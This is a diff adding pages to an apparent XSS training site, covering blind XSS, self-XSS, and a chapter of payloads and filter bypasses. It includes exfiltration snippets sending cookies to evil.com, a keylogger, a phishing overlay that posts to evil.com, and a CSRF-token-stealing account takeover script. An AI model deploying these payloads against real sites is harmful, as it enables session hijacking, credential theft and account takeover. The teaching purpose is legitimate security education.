+        </div>
+    </div>
+
+    <!-- BLIND XSS TOOLS -->
+    <h3 class="sub-heading"><span class="dot"></span> Detection Tools for Blind XSS</h3>
+
+    <div class="code-block">
+        <div class="code-header">
+            <div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div>
+            <span class="code-lang">Blind XSS Callback Payload</span>
+            <button class="code-copy-btn" onclick="copyCode(this)">⎘ Copy</button>
+        </div>
+        <div class="code-body"><span class="c-comment">// Payload injected into contact form, User-Agent, etc.</span>
+<span class="c-comment">// When it fires (even days later), it calls back to your server</span>
+
+<span class="c-tag">&lt;script&gt;</span>
+    <span class="c-comment">// Send notification when payload executes</span>
+    <span class="c-keyword">var</span> data = {
+        url:     <span class="c-func">window.location.href</span>,
+        cookies: <span class="c-danger">document.cookie</span>,
+        dom:     <span class="c-func">document.body.innerHTML.substring</span>(<span class="c-number">0</span>, <span class="c-number">500</span>),
+        time:    <span class="c-keyword">new</span> <span class="c-func">Date</span>().toISOString()
+    };
+    <span class="c-func">fetch</span>(<span class="c-string">'https://your-xss-hunter.com/callback'</span>, {
+        method: <span class="c-string">'POST'</span>,
+        body: JSON.stringify(data)
+    });
+<span class="c-tag">&lt;/script&gt;</span>
+
+<span class="c-comment">// ────────────────────────────────────</span>
+<span class="c-comment">// Popular Blind XSS tools:</span>
+<span class="c-comment">//   • XSS Hunter (xsshunter.trufflesecurity.com)</span>
+<span class="c-comment">//   • bXSS (github.com/LewisArdern/bXSS)</span>
+<span class="c-comment">//   • ezXSS (github.com/ssl/ezXSS)</span>
+<span class="c-comment">//</span>
+<span class="c-comment">// These tools provide a unique payload URL.</span>
+<span class="c-comment">// When it fires, they capture:</span>
+<span class="c-comment">//   📸 Screenshot of the page</span>
+<span class="c-comment">//   🍪 Cookies</span>
+<span class="c-comment">//   🔗 URL where it triggered</span>
+<span class="c-comment">//   📄 DOM snapshot</span>
+<span class="c-comment">//   📋 Page source code</span></div>
+    </div>
+
+    <div class="info-box info">
+        <div class="ib-icon">⏰</div>
+        <div class="ib-content">
+            <strong>Time Delay:</strong>
+            <p>Blind XSS can take <strong>hours, days, or even weeks</strong> to trigger — because the payload fires only when a specific user (usually admin or support staff) views the content. Patience is key!</p>
+        </div>
+    </div>
+
+    <div class="glow-line"></div>
+
+    <!-- SELF-XSS -->
+    <h2 class="section-heading"><span class="sh-icon">🪞</span> Self-XSS</h2>
+
+    <div class="info-box warning">
+        <div class="ib-icon">📖</div>
+        <div class="ib-content">
+            <strong>Definition:</strong>
+            <p>Self-XSS is a type of XSS that <strong>only affects the user who inputs the payload themselves</strong>. It cannot be exploited against other users on its own, which is why most bug bounty programs exclude it.</p>
+        </div>
+    </div>
+
+    <!-- VISUAL DIAGRAM -->
+    <div class="xss-type-visual" data-type="Self-XSS">
+        <h3 style="margin-bottom:18px;font-size:1.1rem;color:var(--text-bright);">How Self-XSS Works</h3>
+        <div class="scenario-box">
+            <div class="scenario-label">Self-XSS Scenario</div>
+            <div class="scenario-actors">
+                <div class="actor-box">
+                    <div class="actor-icon" style="background:rgba(170,68,255,0.15);">👤</div>
+                    <div class="actor-label"><strong>User</strong><br>Pastes payload</div>
+                </div>
+                <div class="actor-arrow">──→</div>
+                <div class="actor-box">
+                    <div class="actor-icon" style="background:rgba(170,68,255,0.15);">📝</div>
+                    <div class="actor-label"><strong>Private Input</strong><br>(settings, notes)</div>
+                </div>
+                <div class="actor-arrow">──→</div>
+                <div class="actor-box">
+                    <div class="actor-icon" style="background:rgba(170,68,255,0.15);">💥</div>
+                    <div class="actor-label"><strong>Script Runs</strong><br>In THEIR browser</div>
+                </div>
+                <div class="actor-arrow" style="color:var(--text-dim);">╳</div>
+                <div class="actor-box" style="opacity:0.4;">
+                    <div class="actor-icon" style="background:rgba(100,100,130,0.15);">👥</div>
+                    <div class="actor-label"><strong>Other Users</strong><br>NOT affected</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <h3 class="sub-heading"><span class="dot"></span> Common Self-XSS Locations</h3>
+
+    <div class="grid-2">
+        <div class="card">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(170,68,255,0.15)">📝</div>Private Note Fields</div>
+            <p style="font-size:0.84rem;color:var(--text-muted);">A "personal notes" field that only the logged-in user can see. Even if XSS is possible, no other user views the output.</p>
+        </div>
+        <div class="card">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(170,68,255,0.15)">💻</div>Browser Console Tricks</div>
+            <p style="font-size:0.84rem;color:var(--text-muted);">Social engineering trick: "Paste this code in your browser console to get free items!" — the user executes the code against themselves.</p>
+        </div>
+        <div class="card">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(170,68,255,0.15)">⚙️</div>User Settings</div>
+            <p style="font-size:0.84rem;color:var(--text-muted);">A settings page where only the logged-in user can see their own saved preferences. XSS here only fires in the user's own browser.</p>
+        </div>
+        <div class="card">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(170,68,255,0.15)">📱</div>Draft/Unsaved Content</div>
+            <p style="font-size:0.84rem;color:var(--text-muted);">Draft blog posts, unpublished content that's only visible to the author — XSS only affects themselves.</p>
+        </div>
+    </div>
+
+    <!-- SELF XSS ESCALATION -->
+    <h3 class="sub-heading"><span class="dot"></span> When Self-XSS Becomes Dangerous</h3>
+
+    <div class="info-box danger">
+        <div class="ib-icon">⚠️</div>
+        <div class="ib-content">
+            <strong>Self-XSS + CSRF = Real Vulnerability!</strong>
+            <p>While Self-XSS alone isn't exploitable, when <strong>combined with other vulnerabilities</strong>, it becomes a real threat:</p>
+        </div>
+    </div>
+
+    <div class="card card-glow" style="border-left:3px solid var(--red);">
+        <h4 style="margin-bottom:12px;font-size:0.95rem;color:var(--text-bright);">Escalation Chain: Self-XSS + Login CSRF</h4>
+        <div class="attack-steps">
+            <div class="attack-step" style="padding:12px 16px;">
+                <div class="as-num" style="background:var(--red);width:28px;height:28px;font-size:0.75rem;">1</div>
+                <div class="as-content">
+                    <h4 style="font-size:0.88rem;">Attacker creates account with XSS in profile name</h4>
+                    <p>Name: <code>&lt;script&gt;fetch('//evil.com?c='+document.cookie)&lt;/script&gt;</code></p>
+                </div>
+            </div>
+            <div class="attack-step" style="padding:12px 16px;">
+                <div class="as-num" style="background:var(--red);width:28px;height:28px;font-size:0.75rem;">2</div>
+                <div class="as-content">
+                    <h4 style="font-size:0.88rem;">Exploits Login CSRF to force victim into attacker's account</h4>
+                    <p>Hidden form auto-submits the attacker's credentials via CSRF</p>
+                </div>
+            </div>
+            <div class="attack-step" style="padding:12px 16px;">
+                <div class="as-num" style="background:var(--red);width:28px;height:28px;font-size:0.75rem;">3</div>
+                <div class="as-content">
+                    <h4 style="font-size:0.88rem;">Victim is now logged into attacker's account</h4>
+                    <p>Victim sees the dashboard of the attacker's account with the XSS payload in the profile name</p>
+                </div>
+            </div>
+            <div class="attack-step" style="padding:12px 16px;border-left-color:var(--red);">
+                <div class="as-num" style="background:var(--red);width:28px;height:28px;font-size:0.75rem;">4</div>
+                <div class="as-content">
+                    <h4 style="font-size:0.88rem;">Self-XSS fires in victim's browser → cookies stolen!</h4>
+                    <p>The victim's cookies from their real session can be exfiltrated, or other attacks can be launched.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- SEVERITY COMPARISON -->
+    <h2 class="section-heading"><span class="sh-icon">📊</span> XSS Types — Severity Comparison</h2>
+
+    <div class="tbl-wrap">
+        <table class="data-table">
+            <thead>
+                <tr>
+                    <th>Type</th>
+                    <th>Severity</th>
+                    <th>Persistence</th>
+                    <th>Victims</th>
+                    <th>Bug Bounty?</th>
+                    <th>Detection</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><strong>Reflected</strong> ↩️</td>
+                    <td><span class="severity-high">High</span></td>
+                    <td>Non-persistent</td>
+                    <td>1 per click</td>
+                    <td><span class="check-yes">✅ Yes</span></td>
+                    <td>Moderate (WAF)</td>
+                </tr>
+                <tr>
+                    <td><strong>Stored</strong> 💾</td>
+                    <td><span class="severity-critical">Critical</span></td>
+                    <td>Persistent (DB)</td>
+                    <td>All visitors</td>
+                    <td><span class="check-yes">✅ Yes ($$$$)</span></td>
+                    <td>Moderate</td>
+                </tr>
+                <tr>
+                    <td><strong>DOM-Based</strong> 🔀</td>
+                    <td><span class="severity-high">High</span></td>
+                    <td>Non-persistent</td>
+                    <td>1 per click</td>
+                    <td><span class="check-yes">✅ Yes</span></td>
+                    <td>Very hard (client-side)</td>
+                </tr>
+                <tr>
+                    <td><strong>Blind</strong> 👁️‍🗨️</td>
+                    <td><span class="severity-critical">Critical</span></td>
+                    <td>Persistent</td>
+                    <td>Admin/internal users</td>
+                    <td><span class="check-yes">✅ Yes ($$$$)</span></td>
+                    <td>Very hard</td>
+                </tr>
+                <tr>
+                    <td><strong>Self-XSS</strong> 🪞</td>
+                    <td><span class="severity-low">Low</span></td>
+                    <td>Varies</td>
+                    <td>Only self</td>
+                    <td><span class="check-no">❌ Usually excluded</span></td>
+                    <td>Easy</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <div class="info-box success">
+        <div class="ib-icon">💡</div>
+        <div class="ib-content">
+            <strong>For Bug Bounty Hunters:</strong>
+            <p>When you find Self-XSS, always try to chain it with CSRF (especially Login CSRF) or other vulnerabilities. If you can demonstrate impact on another user, it gets upgraded from "Informational/Low" to "Medium/High"!</p>
+        </div>
+    </div>
+
+    <div class="feature-highlight text-center" style="margin-top:24px;">
+        <p style="font-size:1rem;margin-bottom:16px;">For the complete deep-dive on all XSS types, payloads, and techniques:</p>
+        <a href="https://potdf.gitbook.io/bug-hunt-book/learning/xss-injection-handbook" target="_blank" rel="noopener noreferrer" class="btn btn-primary">
+            📖 Read the Full Handbook ↗
+        </a>
+    </div>
+
+    <div class="page-nav">
+        <button class="btn btn-outline" onclick="navigateTo(4)">← DOM-Based XSS</button>
+        <button class="btn btn-primary" onclick="navigateTo(6)">Next: Attack Techniques →</button>
+    </div>
+</div>
+
+<!-- ================================================================
+     PAGE 6 — ATTACK TECHNIQUES
+     ================================================================ -->
+<div class="page" id="page-6">
+    <div class="page-header">
+        <div class="chapter-badge badge-attack">💀 Chapter 7</div>
+        <h1 class="page-title">Attack Techniques & Payloads</h1>
+        <p class="page-subtitle">Understanding how attackers exploit XSS — from basic payloads to advanced filter bypass techniques, context-specific injection, and real exploitation scenarios.</p>
+    </div>
+
+    <!-- CONTEXT MAP -->
+    <h2 class="section-heading"><span class="sh-icon">🗺️</span> Injection Context Map</h2>
+
+    <p class="body-text">
+        The most critical factor in crafting an XSS payload is <strong>understanding the context</strong> where your input lands in the HTML. Different contexts require different breakout and injection strategies.
+    </p>
+
+    <div class="tbl-wrap">
+        <table class="data-table">
+            <thead>
+                <tr><th>Context</th><th>Your Input Lands Here</th><th>Breakout Strategy</th><th>Example Payload</th></tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><span class="tag tag-blue">HTML Body</span></td>
+                    <td><code>&lt;div&gt;<strong>INPUT</strong>&lt;/div&gt;</code></td>
+                    <td>Inject new HTML tag</td>
+                    <td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+                </tr>
+                <tr>
+                    <td><span class="tag tag-orange">Attribute (quoted)</span></td>
+                    <td><code>&lt;input value="<strong>INPUT</strong>"&gt;</code></td>
+                    <td>Close attribute + add event</td>
+                    <td><code>" onfocus=alert(1) autofocus "</code></td>
+                </tr>
+                <tr>
+                    <td><span class="tag tag-orange">Attribute (unquoted)</span></td>
+                    <td><code>&lt;input value=<strong>INPUT</strong>&gt;</code></td>
+                    <td>Space + event handler</td>
+                    <td><code>x onfocus=alert(1) autofocus</code></td>
+                </tr>
+                <tr>
+                    <td><span class="tag tag-yellow">href / src</span></td>
+                    <td><code>&lt;a href="<strong>INPUT</strong>"&gt;</code></td>
+                    <td>Use javascript: protocol</td>
+                    <td><code>javascript:alert(1)</code></td>
+                </tr>
+                <tr>
+                    <td><span class="tag tag-cyan">JavaScript String</span></td>
+                    <td><code>var x = '<strong>INPUT</strong>';</code></td>
+                    <td>Close string + inject code</td>
+                    <td><code>';alert(1);//</code></td>
+                </tr>
+                <tr>
+                    <td><span class="tag tag-cyan">JS Template Literal</span></td>
+                    <td><code>var x = `<strong>INPUT</strong>`;</code></td>
+                    <td>Template expression</td>
+                    <td><code>${alert(1)}</code></td>
+                </tr>
+                <tr>
+                    <td><span class="tag tag-purple">Script Block</span></td>
+                    <td><code>&lt;script&gt;...INPUT...&lt;/script&gt;</code></td>
+                    <td>Close script tag</td>
+                    <td><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+                </tr>
+                <tr>
+                    <td><span class="tag tag-gray">HTML Comment</span></td>
+                    <td><code>&lt;!-- <strong>INPUT</strong> --&gt;</code></td>
+                    <td>Close comment</td>
+                    <td><code>--&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- BASIC PAYLOADS -->
+    <h2 class="section-heading"><span class="sh-icon">🎯</span> Common XSS Payloads</h2>
+
+    <div class="tabs">
+        <div class="tab-nav">
+            <button class="tab-btn active" onclick="switchTab(this, 'pay-script')">Script Tags</button>
+            <button class="tab-btn" onclick="switchTab(this, 'pay-events')">Event Handlers</button>
+            <button class="tab-btn" onclick="switchTab(this, 'pay-svg')">SVG / Special</button>
+            <button class="tab-btn" onclick="switchTab(this, 'pay-uri')">URI Schemes</button>
+        </div>
+        <div class="tab-pane active" id="pay-script">
+            <div class="code-block">
+                <div class="code-header">
+                    <div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div>
+                    <span class="code-lang">Script Tag Payloads</span>
+                    <button class="code-copy-btn" onclick="copyCode(this)">⎘ Copy</button>
+                </div>
+                <div class="code-body"><span class="c-comment">// Basic</span>
+<span class="c-tag">&lt;script&gt;</span>alert(<span class="c-number">1</span>)<span class="c-tag">&lt;/script&gt;</span>
+<span class="c-tag">&lt;script&gt;</span>alert(document.cookie)<span class="c-tag">&lt;/script&gt;</span>
+<span class="c-tag">&lt;script&gt;</span>alert(document.domain)<span class="c-tag">&lt;/script&gt;</span>
+
+<span class="c-comment">// External script</span>
+<span class="c-tag">&lt;script</span> <span class="c-attr">src</span>=<span class="c-string">"https://evil.com/xss.js"</span><span class="c-tag">&gt;&lt;/script&gt;</span>
+
+<span class="c-comment">// Template literal (no parentheses)</span>
+<span class="c-tag">&lt;script&gt;</span>alert<span class="c-string">`1`</span><span class="c-tag">&lt;/script&gt;</span>
+
+<span class="c-comment">// Using String.fromCharCode to bypass keyword filters</span>
+<span class="c-tag">&lt;script&gt;</span>alert(String.fromCharCode(<span class="c-number">88,83,83</span>))<span class="c-tag">&lt;/script&gt;</span>
+
+<span class="c-comment">// Base64 encoded eval</span>
+<span class="c-tag">&lt;script&gt;</span>eval(atob(<span class="c-string">'YWxlcnQoMSk='</span>))<span class="c-tag">&lt;/script&gt;</span></div>
+            </div>
+        </div>
+        <div class="tab-pane" id="pay-events">
+            <div class="code-block">
+                <div class="code-header">
+                    <div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div>
+                    <span class="code-lang">Event Handler Payloads</span>
+                    <button class="code-copy-btn" onclick="copyCode(this)">⎘ Copy</button>
+                </div>
+                <div class="code-body"><span class="c-comment">// Image — fires when src fails to load</span>
+<span class="c-tag">&lt;img</span> <span class="c-attr">src</span>=<span class="c-string">x</span> <span class="c-danger">onerror</span>=<span class="c-string">alert(1)</span><span class="c-tag">&gt;</span>
+
+<span class="c-comment">// Input — fires immediately with autofocus</span>
+<span class="c-tag">&lt;input</span> <span class="c-danger">onfocus</span>=<span class="c-string">alert(1)</span> <span class="c-attr">autofocus</span><span class="c-tag">&gt;</span>
+
+<span class="c-comment">// Details — fires when opened (auto via open attr)</span>
+<span class="c-tag">&lt;details</span> <span class="c-attr">open</span> <span class="c-danger">ontoggle</span>=<span class="c-string">alert(1)</span><span class="c-tag">&gt;</span>
+
+<span class="c-comment">// Body — fires on page load</span>
+<span class="c-tag">&lt;body</span> <span class="c-danger">onload</span>=<span class="c-string">alert(1)</span><span class="c-tag">&gt;</span>
+
+<span class="c-comment">// Div — user must hover</span>
+<span class="c-tag">&lt;div</span> <span class="c-danger">onmouseover</span>=<span class="c-string">alert(1)</span><span class="c-tag">&gt;</span>Hover me<span class="c-tag">&lt;/div&gt;</span>
+
+<span class="c-comment">// Marquee — fires when scrolling starts</span>
+<span class="c-tag">&lt;marquee</span> <span class="c-danger">onstart</span>=<span class="c-string">alert(1)</span><span class="c-tag">&gt;</span>
+
+<span class="c-comment">// Video/Audio — fires on load error</span>
+<span class="c-tag">&lt;video</span> <span class="c-attr">src</span>=<span class="c-string">x</span> <span class="c-danger">onerror</span>=<span class="c-string">alert(1)</span><span class="c-tag">&gt;</span>
+<span class="c-tag">&lt;audio</span> <span class="c-attr">src</span>=<span class="c-string">x</span> <span class="c-danger">onerror</span>=<span class="c-string">alert(1)</span><span class="c-tag">&gt;</span></div>
+            </div>
+        </div>
+        <div class="tab-pane" id="pay-svg">
+            <div class="code-block">
+                <div class="code-header">
+                    <div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div>
+                    <span class="code-lang">SVG & Special Element Payloads</span>
+                    <button class="code-copy-btn" onclick="copyCode(this)">⎘ Copy</button>
+                </div>
+                <div class="code-body"><span class="c-comment">// SVG — onload fires immediately</span>
+<span class="c-tag">&lt;svg</span> <span class="c-danger">onload</span>=<span class="c-string">alert(1)</span><span class="c-tag">&gt;</span>
+<span class="c-tag">&lt;svg/</span><span class="c-danger">onload</span>=<span class="c-string">alert(1)</span><span class="c-tag">&gt;</span>
+
+<span class="c-comment">// SVG with embedded script</span>
+<span class="c-tag">&lt;svg&gt;&lt;script&gt;</span>alert(<span class="c-number">1</span>)<span class="c-tag">&lt;/script&gt;&lt;/svg&gt;</span>
+
+<span class="c-comment">// SVG animate</span>
+<span class="c-tag">&lt;svg&gt;&lt;animate</span> <span class="c-danger">onbegin</span>=<span class="c-string">alert(1)</span> <span class="c-attr">attributeName</span>=<span class="c-string">x</span><span class="c-tag">&gt;</span>
+
+<span class="c-comment">// Math ML (some browsers)</span>
+<span class="c-tag">&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;</span>
+<span class="c-comment">&lt;!--</span><span class="c-tag">&lt;/style&gt;&lt;img</span> <span class="c-attr">src</span>=<span class="c-string">x</span> <span class="c-danger">onerror</span>=<span class="c-string">alert(1)</span><span class="c-tag">&gt;</span>
+
+<span class="c-comment">// Object/Embed</span>
+<span class="c-tag">&lt;object</span> <span class="c-attr">data</span>=<span class="c-string">"javascript:alert(1)"</span><span class="c-tag">&gt;</span>
+<span class="c-tag">&lt;embed</span> <span class="c-attr">src</span>=<span class="c-string">"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"</span><span class="c-tag">&gt;</span></div>
+            </div>
+        </div>
+        <div class="tab-pane" id="pay-uri">
+            <div class="code-block">
+                <div class="code-header">
+                    <div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div>
+                    <span class="code-lang">JavaScript & Data URI Payloads</span>
+                    <button class="code-copy-btn" onclick="copyCode(this)">⎘ Copy</button>
+                </div>
+                <div class="code-body"><span class="c-comment">// javascript: URI in href</span>
+<span class="c-tag">&lt;a</span> <span class="c-attr">href</span>=<span class="c-danger">"javascript:alert(1)"</span><span class="c-tag">&gt;</span>Click<span class="c-tag">&lt;/a&gt;</span>
+
+<span class="c-comment">// javascript: URI in form action</span>
+<span class="c-tag">&lt;form</span> <span class="c-attr">action</span>=<span class="c-danger">"javascript:alert(1)"</span><span class="c-tag">&gt;</span>
+    <span class="c-tag">&lt;input</span> <span class="c-attr">type</span>=<span class="c-string">submit</span><span class="c-tag">&gt;</span>
+<span class="c-tag">&lt;/form&gt;</span>
+
+<span class="c-comment">// data: URI in iframe</span>
+<span class="c-tag">&lt;iframe</span> <span class="c-attr">src</span>=<span class="c-danger">"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"</span><span class="c-tag">&gt;</span>
+
+<span class="c-comment">// data: URI with base64</span>
+<span class="c-tag">&lt;iframe</span> <span class="c-attr">src</span>=<span class="c-danger">"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="</span><span class="c-tag">&gt;</span>
+
+<span class="c-comment">// button formaction</span>
+<span class="c-tag">&lt;button</span> <span class="c-attr">formaction</span>=<span class="c-danger">"javascript:alert(1)"</span><span class="c-tag">&gt;</span>Click<span class="c-tag">&lt;/button&gt;</span></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- FILTER BYPASS -->
+    <h2 class="section-heading"><span class="sh-icon">🔓</span> Filter Bypass Techniques</h2>
+
+    <p class="body-text">
+        Many applications try to block XSS using blacklists or input filters. These are <strong>always bypassable</strong> with creative encoding, obfuscation, and alternative syntax. This is why output encoding and CSP are far superior to filtering.
+    </p>
+
+    <div class="tbl-wrap">
+        <table class="data-table">
+            <thead>
+                <tr><th>What's Blocked</th><th>Bypass Technique</th><th>Payload</th></tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><code>&lt;script&gt;</code> tag</td>
+                    <td>Use event handlers instead</td>
+                    <td><code>&lt;img src=x onerror=alert(1)&gt;</code></td>
+                </tr>
+                <tr>
+                    <td><code>&lt;script&gt;</code> (case-sensitive)</td>
+                    <td>Mixed case</td>
+                    <td><code>&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;</code></td>
+                </tr>
+                <tr>
+                    <td><code>alert</code> function</td>
+                    <td>Use confirm/prompt or constructor</td>
+                    <td><code>&lt;img src=x onerror=confirm(1)&gt;</code></td>
+                </tr>
+                <tr>
+                    <td><code>alert()</code> with parentheses</td>
+                    <td>Template literals</td>
+                    <td><code>&lt;img src=x onerror=alert&#96;1&#96;&gt;</code></td>
+                </tr>
+                <tr>
+                    <td>Parentheses <code>( )</code></td>
+                    <td>onerror+throw</td>
+                    <td><code>&lt;script&gt;onerror=alert;throw 1&lt;/script&gt;</code></td>
+                </tr>
+                <tr>
+                    <td><code>&lt;</code> and <code>&gt;</code> chars</td>
+                    <td>Attribute context (if inside one)</td>
+                    <td><code>" onfocus=alert(1) autofocus "</code></td>
+                </tr>
+                <tr>
+                    <td>Removes <code>&lt;script&gt;</code> once</td>
+                    <td>Nested / recursive</td>
+                    <td><code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code></td>
+                </tr>
+                <tr>
+                    <td>All <code>on*</code> event handlers</td>
+                    <td>Use &lt;script&gt; tag instead</td>
+                    <td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+                </tr>
+                <tr>
+                    <td>Keyword detection</td>
+                    <td>HTML entity encoding</td>
+                    <td><code>&lt;img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)&gt;</code></td>
+                </tr>
+                <tr>
+                    <td>Keyword detection</td>
+                    <td>JavaScript unicode escapes</td>
+                    <td><code>&lt;script&gt;\u0061\u006cert(1)&lt;/script&gt;</code></td>
+                </tr>
+                <tr>
+                    <td>Spaces blocked</td>
+                    <td>Forward slash separator</td>
+                    <td><code>&lt;svg/onload=alert(1)&gt;</code></td>
+                </tr>
+                <tr>
+                    <td>WAF signature match</td>
+                    <td>Double encoding</td>
+                    <td><code>%253Cscript%253Ealert(1)%253C%252Fscript%253E</code></td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- EXPLOITATION TECHNIQUES -->
+    <h2 class="section-heading"><span class="sh-icon">💀</span> Real Exploitation Techniques</h2>
+
+    <div class="grid-2">
+        <div class="card card-accent-red">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(213,0,0,0.15)">🍪</div>Cookie Theft & Session Hijacking</div>
+            <div class="code-block mb-0">
+                <div class="code-header"><div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div><span class="code-lang">Exfiltration Methods</span></div>
+                <div class="code-body" style="font-size:0.78rem;"><span class="c-comment">// Image beacon (most stealthy)</span>
+<span class="c-keyword">new</span> Image().src =
+  <span class="c-string">'https://evil.com/steal?c='</span>
+  + <span class="c-danger">document.cookie</span>;
+
+<span class="c-comment">// Fetch API</span>
+<span class="c-func">fetch</span>(<span class="c-string">'https://evil.com/s?c='</span>
+  + <span class="c-danger">document.cookie</span>);
+
+<span class="c-comment">// SendBeacon (survives page nav)</span>
+navigator.<span class="c-func">sendBeacon</span>(
+  <span class="c-string">'https://evil.com/s'</span>,
+  <span class="c-danger">document.cookie</span>
+);</div>
+            </div>
+        </div>
+        <div class="card card-accent-orange">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(255,136,0,0.15)">⌨️</div>Keylogging</div>
+            <div class="code-block mb-0">
+                <div class="code-header"><div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div><span class="code-lang">Keystroke Capture</span></div>
+                <div class="code-body" style="font-size:0.78rem;"><span class="c-comment">// Capture all keystrokes</span>
+document.addEventListener(
+  <span class="c-string">'keypress'</span>,
+  <span class="c-keyword">function</span>(e) {
+    <span class="c-keyword">new</span> Image().src =
+      <span class="c-string">'https://evil.com/k?key='</span>
+      + e.key
+      + <span class="c-string">'&url='</span>
+      + location.href;
+  }
+);
+
+<span class="c-comment">// Records passwords, CC#s,</span>
+<span class="c-comment">// and all typed content!</span></div>
+            </div>
+        </div>
+        <div class="card card-accent-pink" style="border-top:3px solid var(--pink);">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(255,68,170,0.15)">🎭</div>Phishing Overlay</div>
+            <div class="code-block mb-0">
+                <div class="code-header"><div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div><span class="code-lang">Fake Login Form</span></div>
+                <div class="code-body" style="font-size:0.78rem;"><span class="c-comment">// Replace page with fake login</span>
+document.body.innerHTML = <span class="c-string">`
+  &lt;div style="..."&gt;
+    &lt;h2&gt;Session Expired&lt;/h2&gt;
+    &lt;form action="https://evil.com"&gt;
+      &lt;input name="user"
+        placeholder="Username"&gt;
+      &lt;input name="pass"
+        type="password"
+        placeholder="Password"&gt;
+      &lt;button&gt;Log In&lt;/button&gt;
+    &lt;/form&gt;
+  &lt;/div&gt;`</span>;
+<span class="c-comment">// Looks legitimate — same URL!</span></div>
+            </div>
+        </div>
+        <div class="card card-accent-purple">
+            <div class="card-title"><div class="ct-icon" style="background:rgba(108,99,255,0.15)">🔄</div>Account Takeover (CSRF via XSS)</div>
+            <div class="code-block mb-0">
+                <div class="code-header"><div class="code-dots"><span class="d d-red"></span><span class="d d-yellow"></span><span class="d d-green"></span></div><span class="code-lang">Change Email + Password</span></div>
+                <div class="code-body" style="font-size:0.78rem;"><span class="c-comment">// XSS bypasses CSRF tokens!</span>
+<span class="c-comment">// Step 1: Get CSRF token</span>
+<span class="c-func">fetch</span>(<span class="c-string">'/settings'</span>)
+  .then(r =&gt; r.text())
+  .then(html =&gt; {
+    <span class="c-keyword">let</span> token = html.match(
+      <span class="c-string">/csrf.*?value="(.*?)"/</span>
+    )[<span class="c-number">1</span>];
+    <span class="c-comment">// Step 2: Change email</span>
+    <span class="c-func">fetch</span>(<span class="c-string">'/settings'</span>, {
+      method: <span class="c-string">'POST'</span>,
+      body: <span class="c-string">'csrf='</span>+token
+        +<span class="c-string">'&email=evil@hack.com'</span>
+    });
+  });</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- IMPACT TABLE -->
+    <h2 class="section-heading"><span class="sh-icon">📊</span> Exploitation Impact Matrix</h2>
+
+    <div class="tbl-wrap">
+        <table class="data-table">
+            <thead>
+                <tr><th>Attack</th><th>Severity</th><th>Requirements</th><th>User Interaction?</th></tr>
+            </thead>
+            <tbody>
+                <tr><td><strong>Cookie Theft</strong></td><td><span class="severity-high">High</span></td><td>No HttpOnly flag</td><td>None</td></tr>
+                <tr><td><strong>Session Hijacking</strong></td><td><span class="severity-high">High</span></td><td>No HttpOnly flag</td><td>None</td></tr>
+                <tr><td><strong>Account Takeover</strong></td><td><span class="severity-critical">Critical</span></td><td>AJAX capability</td><td>None</td></tr>
+                <tr><td><strong>Phishing Overlay</strong></td><td><span class="severity-high">High</span></td><td>Convincing UI</td><td>Victim submits form</td></tr>
+                <tr><td><strong>Keylogging</strong></td><td><span class="severity-high">High</span></td><td>Victim types on page</td><td>Typing</td></tr>
+                <tr><td><strong>Worm Propagation</strong></td><td><span class="severity-critical">Critical</span></td><td>Stored XSS + social features</td><td>None</td></tr>
+                <tr><td><strong>Crypto Mining</strong></td><td><span class="severity-medium">Medium</span></td><td>Sustained execution</td><td>Staying on page</td></tr>
+                <tr><td><strong>Internal Port Scan</strong></td><td><span class="severity-medium">Medium</span></td><td>XSS on internal app</td><td>None</td></tr>
+                <tr><td><strong>Defacement</strong></td><td><span class="severity-medium">Medium</span></td><td>Any XSS</td><td>None</td></tr>
+                <tr><td><strong>Malware Distribution</strong></td><td><span class="severity-high">High</span></td><td>User trust in domain</td><td>Download</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <div class="info-box danger">
+        <div class="ib-icon">⚠️</div>
+        <div class="ib-content">
+            <strong>Important:</strong>
+            <p>These techniques are shown for <strong>educational and defensive purposes only</strong>. Understanding attacks is essential for building effective defenses. Never use these techniques on systems without explicit written authorization.</p>
+        </div>
+    </div>
+
+    <div class="page-nav">
+        <button class="btn btn-outline" onclick="navigateTo(5)">← Other XSS Types</button>
+        <button class="btn btn-primary" onclick="navigateTo(7)">Next: Prevention →</button>
+    </div>
